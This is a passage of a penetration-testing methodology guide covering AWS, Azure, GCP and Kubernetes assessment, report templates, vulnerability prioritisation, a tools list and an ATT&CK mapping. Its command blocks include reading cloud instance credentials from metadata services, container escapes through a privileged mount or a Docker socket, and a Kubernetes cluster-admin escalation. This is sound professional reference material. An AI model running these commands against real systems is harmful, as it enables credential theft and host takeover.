# Attached policies
aws iam list-attached-user-policies --user-name username
aws iam get-user-policy --user-name username --policy-name PolicyName

# S3 enumeration
aws s3 ls
aws s3 ls s3://bucket-name/
# Unauthenticated S3 access
aws s3 ls s3://bucket-name/ --no-sign-request

# EC2 metadata (from SSRF or shell access)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# IMDSv2
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# ScoutSuite AWS audit
scout aws --report-dir scout_report/

# Prowler AWS assessment
prowler aws --region us-east-1 --output-formats json html
```

### 7.2 Azure Security Assessment

```bash
# Azure CLI enumeration
az login
az account list
az account show

# Resource enumeration
az group list --output table
az vm list --output table
az storage account list --output table
az keyvault list --output table
az webapp list --output table

# Identity and access
az ad user list --output table
az ad group list --output table
az role assignment list --output table

# Storage account access
az storage account keys list --account-name ACCOUNT
az storage blob list --account-name ACCOUNT --container CONTAINER

# Azure AD application secrets
az ad app list --output table
az ad sp list --output table
az ad app credential list --id APP_ID

# ROADtools for Azure AD
pip3 install roadtools
roadrecon auth -u user@target.com -p password
roadrecon gather
roadrecon gui
```

### 7.3 GCP Security Assessment

```bash
# GCP CLI enumeration
gcloud auth list
gcloud config list
gcloud projects list

# IAM enumeration
gcloud iam service-accounts list
gcloud projects get-iam-policy PROJECT_ID
gcloud iam roles list --project=PROJECT_ID

# Compute enumeration
gcloud compute instances list
gcloud compute firewall-rules list
gcloud compute networks list

# Storage
gcloud storage buckets list
gsutil ls gs://bucket-name/
gsutil cat gs://bucket-name/sensitive.txt
# Unauthenticated access
gsutil ls -u PROJECT_ID gs://bucket-name/

# GCP metadata service (SSRF or instance access)
curl "http://metadata.google.internal/computeMetadata/v1/" \
  -H "Metadata-Flavor: Google"
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# GCP ScoutSuite
scout gcp --report-dir scout_gcp/
```

### 7.4 Container and Kubernetes Security

```bash
# Docker security checks
docker version
docker info | grep -i "security\|root\|namespace"
cat /proc/1/cgroup | grep -i docker
ls /.dockerenv 2>/dev/null

# Container escape -- privileged container
ls /dev
mount /dev/sda1 /mnt
chroot /mnt bash

# Container escape -- mounted Docker socket
ls -la /var/run/docker.sock
docker -H unix:///var/run/docker.sock run -v /:/hostfs --rm -it alpine chroot /hostfs sh

# Kubernetes enumeration
kubectl get pods --all-namespaces
kubectl get services --all-namespaces
kubectl get secrets --all-namespaces
kubectl get serviceaccounts --all-namespaces
kubectl auth can-i --list

# Kubernetes API server check
curl -k https://kubernetes.default.svc/api/v1/namespaces
curl -k -H "Authorization: Bearer TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces

# Kubernetes RBAC escalation
kubectl get clusterrolebindings -o wide
kubectl create clusterrolebinding pwned \
  --clusterrole=cluster-admin --serviceaccount=default:default

# KubeHunter
pip3 install kube-hunter
kube-hunter --remote 10.10.10.1
kube-hunter --pod  # when running inside a pod
```

---

## 8. Professional Reporting

### 8.1 Executive Summary Structure

The executive summary must be readable by non-technical stakeholders:

```markdown
## Executive Summary

### Overview
[2-3 sentences: what was tested, when, by whom]

### Key Findings
| Severity | Count |
|----------|-------|
| Critical | X     |
| High     | X     |
| Medium   | X     |
| Low      | X     |
| Informational | X |

### Risk Posture
[1 paragraph: overall security posture assessment]

### Top 3 Priority Remediation Items
1. [Finding name] -- [brief impact statement]
2. [Finding name] -- [brief impact statement]
3. [Finding name] -- [brief impact statement]

### Strategic Recommendations
[3-5 bullet points of program-level recommendations]
```

### 8.2 Technical Finding Format

Each finding must include all of the following fields:

```markdown
## Finding: [Descriptive Title]

**Finding ID:** PENTEST-2026-001
**Severity:** Critical | High | Medium | Low | Informational
**CVSS v3.1 Score:** X.X (Vector String)
**EPSS Score:** X.XXXX (XX.X percentile)
**CISA KEV:** Yes | No
**CVE Reference:** CVE-XXXX-XXXXX (if applicable)
**CWE:** CWE-XXX

### Description
[Technical description of the vulnerability]

### Evidence
[Screenshots, code snippets, request/response pairs]

### Impact
[Business and technical impact if exploited]

### Affected Assets
- target.com/api/v1/login
- 203.0.113.10:443

### Remediation
[Specific, actionable remediation steps]

### References
- [OWASP reference]
- [CWE link]
- [Vendor advisory]
```

### 8.3 CVSS v3.1 Scoring

CVSS v3.1 uses the following metrics:

**Base Score Metrics:**

| Metric | Options |
|--------|---------|
| Attack Vector (AV) | Network (N), Adjacent (A), Local (L), Physical (P) |
| Attack Complexity (AC) | Low (L), High (H) |
| Privileges Required (PR) | None (N), Low (L), High (H) |
| User Interaction (UI) | None (N), Required (R) |
| Scope (S) | Unchanged (U), Changed (C) |
| Confidentiality (C) | None (N), Low (L), High (H) |
| Integrity (I) | None (N), Low (L), High (H) |
| Availability (A) | None (N), Low (L), High (H) |

**Score Ranges:**

| Score | Severity |
|-------|----------|
| 0.0 | None |
| 0.1-3.9 | Low |
| 4.0-6.9 | Medium |
| 7.0-8.9 | High |
| 9.0-10.0 | Critical |

**Example CVSS Calculation:**

```
CVE-2021-44228 (Log4Shell)
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
Score: 10.0 (Critical)

Breakdown:
- AV:N  -- Exploitable over the network
- AC:L  -- No special conditions required
- PR:N  -- No authentication needed
- UI:N  -- No user interaction
- S:C   -- Impact crosses trust boundaries
- C:H   -- Full confidentiality impact
- I:H   -- Full integrity impact
- A:H   -- Full availability impact
```

### 8.4 EPSS and CISA KEV Prioritization

Prioritization beyond CVSS uses real-world exploitation likelihood:

```bash
# Query EPSS for vulnerability prioritization
curl -s "https://api.first.org/data/v1/epss?cve=CVE-2021-44228,CVE-2021-45046" \
  | jq '.data[] | {cve: .cve, epss: (.epss | tonumber), percentile: (.percentile | tonumber)}'

# Download full EPSS dataset
curl -s "https://epss.cyentia.com/epss_scores-current.csv.gz" | gunzip > epss_current.csv

# Cross-reference with CISA KEV
curl -s "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json" \
  | jq -r '.vulnerabilities[] | select(.cveID == "CVE-2021-44228") | .dueDate'
```

**Prioritization Matrix:**

| CVSS Score | EPSS Score | CISA KEV | Priority |
|------------|------------|----------|----------|
| >= 9.0 | >= 0.7 | Yes | P0 -- Immediate (24h) |
| >= 7.0 | >= 0.4 | Yes | P1 -- Critical (72h) |
| >= 9.0 | < 0.1 | No | P2 -- High (1 week) |
| >= 7.0 | >= 0.2 | No | P2 -- High (1 week) |
| 4.0-6.9 | Any | Yes | P2 -- High (1 week) |
| 4.0-6.9 | >= 0.1 | No | P3 -- Medium (30 days) |
| < 4.0 | Any | No | P4 -- Low (90 days) |

### 8.5 Retesting Procedures

```markdown
## Retesting Methodology

### Pre-Retest Requirements
- Client confirms remediation has been applied
- Written authorization for retesting window
- Same scope as original engagement

### Retest Procedure
1. Re-execute original exploitation steps verbatim
2. Document new response (patched/partial/unpatched)
3. For partial fixes: document remaining attack surface
4. Test for regression (fix introducing new vulnerability)

### Retest Finding Status
| Status | Definition |
|--------|-----------|
| Remediated | Vulnerability fully addressed; exploitation no longer possible |
| Partially Remediated | Mitigation applied but residual risk remains |
| Not Remediated | No change from original finding |
| Risk Accepted | Client formally accepted risk in writing |
```

---

## 9. Tools Reference

| Tool | Category | Purpose | Installation |
|------|----------|---------|--------------|
| nmap | Scanning | Port scanning and service detection | `apt install nmap` |
| masscan | Scanning | High-speed port scanning | `apt install masscan` |
| nuclei | Vulnerability | Template-based vulnerability scanner | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` |
| subfinder | Recon | Passive subdomain enumeration | `go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest` |
| amass | Recon | Attack surface mapping | `go install github.com/owasp-amass/amass/v4/...@master` |
| dnsx | Recon | DNS resolver toolkit | `go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest` |
| httpx | Web | HTTP toolkit for probing | `go install github.com/projectdiscovery/httpx/cmd/httpx@latest` |
| ffuf | Web | Fast web fuzzer | `go install github.com/ffuf/ffuf/v2@latest` |
| gobuster | Web | Directory and DNS brute-forcing | `go install github.com/OJ/gobuster/v3@latest` |
| feroxbuster | Web | Fast recursive content discovery | `cargo install feroxbuster` |
| sqlmap | Web | SQL injection automation | `apt install sqlmap` |
| burpsuite | Web | HTTP proxy and web testing suite | Download from portswigger.net |
| nikto | Web | Web server scanner | `apt install nikto` |
| whatweb | Web | Web application fingerprinting | `apt install whatweb` |
| wafw00f | Web | WAF fingerprinting | `pip install wafw00f` |
| jwt_tool | Web | JWT testing and exploitation | `pip install jwt-tool` |
| metasploit | Exploitation | Exploit framework | `apt install metasploit-framework` |
| impacket | Exploitation | Network protocol exploitation | `pip install impacket` |
| crackmapexec | AD/SMB | Active Directory assessment | `pip install crackmapexec` |
| bloodhound | AD | AD attack path visualization | Download from github.com/BloodHoundAD |
| enum4linux-ng | SMB | SMB and LDAP enumeration | `pip install enum4linux-ng` |
| responder | Network | LLMNR/NBT-NS poisoning | `apt install responder` |
| hashcat | Password | GPU-accelerated hash cracking | `apt install hashcat` |
| john | Password | Password cracker | `apt install john` |
| hydra | Password | Online brute-force | `apt install hydra` |
| medusa | Password | Parallel login brute-forcer | `apt install medusa` |
| kerbrute | Kerberos | Kerberos username enumeration | Download from github.com/ropnop/kerbrute |
| evil-winrm | Windows | WinRM shell | `gem install evil-winrm` |
| linpeas | Privesc | Linux privilege escalation script | Download from github.com/carlospolop |
| winpeas | Privesc | Windows privilege escalation script | Download from github.com/carlospolop |
| chisel | Tunneling | TCP/UDP tunnel over HTTP | Download from github.com/jpillora/chisel |
| ligolo-ng | Tunneling | Tunneling tool | Download from github.com/nicocha30/ligolo-ng |
| shodan | Recon | Internet-wide scanning database | `pip install shodan` |
| theHarvester | OSINT | Email and subdomain harvesting | `apt install theharvester` |
| recon-ng | OSINT | Web reconnaissance framework | `apt install recon-ng` |
| maltego | OSINT | Visual link analysis | Download from maltego.com |
| pacu | Cloud | AWS exploitation framework | `pip install pacu` |
| scoutsuite | Cloud | Cloud infrastructure auditing | `pip install scoutsuite` |
| prowler | Cloud | AWS/Azure/GCP security tool | `pip install prowler` |
| trivy | Container | Container vulnerability scanner | Download from github.com/aquasecurity/trivy |
| kube-hunter | K8s | Kubernetes security assessment | `pip install kube-hunter` |
| openvas | Vuln Mgmt | Open-source vulnerability scanner | `apt install openvas` |
| nessus | Vuln Mgmt | Commercial vulnerability scanner | Download from tenable.com |

---

## 10. MITRE ATT&CK Mapping

### 10.1 Tactic and Technique Overview

The MITRE ATT&CK Enterprise Matrix v14 covers 14 tactics:

| Tactic | ID | Description |
|--------|-----|-------------|
| Reconnaissance | TA0043 | Gathering information to plan future operations |
| Resource Development | TA0042 | Establishing resources to support operations |
| Initial Access | TA0001 | Gaining entry into the target network |
| Execution | TA0002 | Running adversary-controlled code |
| Persistence | TA0003 | Maintaining foothold across restarts |
| Privilege Escalation | TA0004 | Gaining higher permissions |
| Defense Evasion | TA0005 | Avoiding detection |
| Credential Access | TA0006 | Stealing credentials |
| Discovery | TA0007 | Learning about the environment |
| Lateral Movement | TA0008 | Moving through the environment |
| Collection | TA0009 | Gathering data of interest |
| Command and Control | TA0011 | Communicating with compromised systems |
| Exfiltration | TA0010 | Stealing data |
| Impact | TA0040 | Manipulating, interrupting, or destroying systems |

### 10.2 Technique Mapping by Phase

#### Reconnaissance (TA0043)

| Technique | ID | Pentest Activity |
|-----------|-----|-----------------|
| Active Scanning: Scanning IP Blocks | T1595.001 | nmap, masscan network sweeps |
| Active Scanning: Vulnerability Scanning | T1595.002 | nuclei, OpenVAS scans |
| Gather Victim Host Information: DNS | T1590.002 | dnsx, subfinder, amass |
| Search Open Technical Databases: Shodan | T1596.005 | shodan, censys queries |
| Search Open Websites/Domains: Social Media | T1593.001 | LinkedIn, Twitter OSINT |
| Phishing for Information | T1598 | Social engineering testing |

#### Initial Access (TA0001)

| Technique | ID | Pentest Activity |
|-----------|-----|-----------------|
| Exploit Public-Facing Application | T1190 | Web app exploitation, CVE exploitation |
| Phishing: Spearphishing Link | T1566.002 | Phishing simulation |
| Valid Accounts: Default Accounts | T1078.001 | Default credential testing |
| Valid Accounts: Domain Accounts | T1078.002 | Credential stuffing |
| External Remote Services | T1133 | VPN, Citrix, RDP exploitation |
| Trusted Relationship | T1199 | Third-party vendor access |

#### Execution (TA0002)

| Technique | ID | Pentest Activity |
|-----------|-----|-----------------|
| Command and Scripting Interpreter: PowerShell | T1059.001 | PowerShell payloads |
| Command and Scripting Interpreter: Bash | T1059.004 | Shell script execution |
| Exploitation for Client Execution | T1203 | Browser/Office exploits |
| User Execution: Malicious File | T1204.002 | Phishing attachments |
| Scheduled Task/Job: Scheduled Task | T1053.005 | Scheduled task persistence |

#### Persistence (TA0003)

| Technique | ID | Pentest Activity |
|-----------|-----|-----------------|
| Boot or Logon Autostart: Registry Run Keys | T1547.001 | Registry persistence |
| Create Account: Local Account | T1136.001 | Local user creation |
| Create Account: Domain Account | T1136.002 | AD user creation |
| Scheduled Task/Job: Cron | T1053.003 | Linux cron persistence |
| Server Software Component: Web Shell | T1505.003 | Web shell deployment |
| Account Manipulation: SSH Authorized Keys | T1098.004 | SSH key persistence |

#### Privilege Escalation (TA0004)

| Technique | ID | Pentest Activity |
|-----------|-----|-----------------|
| Exploitation for Privilege Escalation | T1068 | Local privilege escalation CVEs |
| Abuse Elevation Control Mechanism: Sudo | T1548.003 | Sudo misconfiguration |
| Access Token Manipulation | T1134 | Token impersonation, PTH |
| Process Injection | T1055 | DLL injection, shellcode injection |
| Valid Accounts: Local Accounts | T1078.003 | Reusing local credentials |

#### Credential Access (TA0006)

| Technique | ID | Pentest Activity |
|-----------|-----|-----------------|
| OS Credential Dumping: LSASS Memory | T1003.001 | Mimikatz, procdump |
| OS Credential Dumping: SAM | T1003.002 | SAM file extraction |
| OS Credential Dumping: NTDS | T1003.003 | NTDS.dit extraction |
| Brute Force: Password Spraying | T1110.003 | CrackMapExec spraying |
| Steal or Forge Kerberos Tickets: Kerberoasting | T1558.003 | SPN ticket request |
| Steal or Forge Kerberos Tickets: AS-REP Roasting | T1558.004 | Pre-auth disabled accounts |
| Credentials from Password Stores | T1555 | Browser credential extraction |

#### Discovery (TA0007)

| Technique | ID | Pentest Activity |
|-----------|-----|-----------------|
| Account Discovery: Domain Account | T1087.002 | LDAP user enumeration |
| Domain Trust Discovery | T1482 | AD trust mapping |
| Network Service Discovery | T1046 | nmap service scanning |
| Network Share Discovery | T1135 | SMB share enumeration |
| Permission Groups Discovery: Domain Groups | T1069.002 | AD group enumeration |
| System Network Configuration Discovery | T1016 | ipconfig, route enumeration |

#### Lateral Movement (TA0008)

| Technique | ID | Pentest Activity |
|-----------|-----|-----------------|
| Exploitation of Remote Services | T1210 | EternalBlue, BlueKeep |
| Internal Spearphishing | T1534 | Internal phishing simulation |
| Remote Service Session Hijacking: RDP Hijacking | T1563.002 | RDP session takeover |
| Remote Services: SMB/Windows Admin Shares | T1021.002 | PSExec, CME execution |
| Remote Services: WinRM | T1021.006 | Evil-WinRM lateral movement |
| Use Alternate Authentication Material: Pass the Hash | T1550.002 | PTH with impacket |
| Use Alternate Authentication Material: Pass the Ticket | T1550.003 | PTT with Kerberos |

#### Exfiltration (TA0010)

| Technique | ID | Pentest Activity |
|-----------|-----|-----------------|
| Exfiltration Over C2 Channel | T1041 | Data exfil via Meterpreter |
| Exfiltration Over Web Service | T1567 | Data exfil via HTTP |
| Exfiltration Over Alternative Protocol: DNS | T1048.003 | DNS tunneling (iodine, dnscat2) |
| Data Transfer Size Limits | T1030 | Chunked exfiltration |

### 10.3 ATT&CK Navigator Layer Export

```json
{
  "name": "Pentest Engagement Coverage",
  "versions": {"attack": "14", "navigator": "4.9", "layer": "4.5"},
  "domain": "enterprise-attack",
  "techniques": [
    {"techniqueID": "T1595", "score": 1, "color": "#ff6666", "comment": "Performed"},
    {"techniqueID": "T1190", "score": 1, "color": "#ff6666", "comment": "Performed"},
    {"techniqueID": "T1059", "score": 1, "color": "#ff6666", "comment": "Performed"},
    {"techniqueID": "T1547", "score": 1, "color": "#ff6666", "comment": "Performed"},
    {"techniqueID": "T1068", "score": 1, "color": "#ff6666", "comment": "Performed"},
    {"techniqueID": "T1003", "score": 1, "color": "#ff6666", "comment": "Performed"},
    {"techniqueID": "T1046", "score": 1, "color": "#ff6666", "comment": "Performed"},
    {"techniqueID": "T1021", "score": 1, "color": "#ff6666", "comment": "Performed"},
    {"techniqueID": "T1550", "score": 1, "color": "#ff6666", "comment": "Performed"},
    {"techniqueID": "T1041", "score": 1, "color": "#ff6666", "comment": "Performed"}
  ],
  "gradient": {"colors": ["#ffffff","#ff6666"], "minValue": 0, "maxValue": 1},
  "legendItems": [{"label": "Techniques Exercised", "color": "#ff6666"}]
}
```

### 10.4 Finding-to-ATT&CK Cross-Reference Template

```markdown
| Finding ID | Finding Title | ATT&CK Tactic | ATT&CK Technique | Technique ID |
|------------|---------------|---------------|------------------|--------------|
| PENTEST-001 | SQLi in Login | Initial Access | Exploit Public-Facing Application | T1190 |
| PENTEST-002 | Default Creds | Initial Access | Valid Accounts: Default Accounts | T1078.001 |
| PENTEST-003 | NTLM Hash Dump | Credential Access | OS Credential Dumping: LSASS Memory | T1003.001 |
| PENTEST-004 | SMB Lateral Mvmt | Lateral Movement | Remote Services: SMB | T1021.002 |
| PENTEST-005 | Scheduled Task | Persistence | Scheduled Task/Job: Scheduled Task | T1053.005 |
```

---

*This document is intended for authorized security professionals only. All techniques described must only be applied against systems for which explicit written authorization has been obtained. Unauthorized use may violate the Computer Fraud and Abuse Act, Computer Misuse Act, and other applicable laws.*

*References: PTES (http://www.pentest-standard.org/), OWASP Testing Guide v4.2 (https://owasp.org/www-project-web-security-testing-guide/), MITRE ATT&CK v14 (https://attack.mitre.org/), NIST SP 800-115 (https://csrc.nist.gov/publications/detail/sp/800/115/final), CVSS v3.1 Specification (https://www.first.org/cvss/specification-document)*
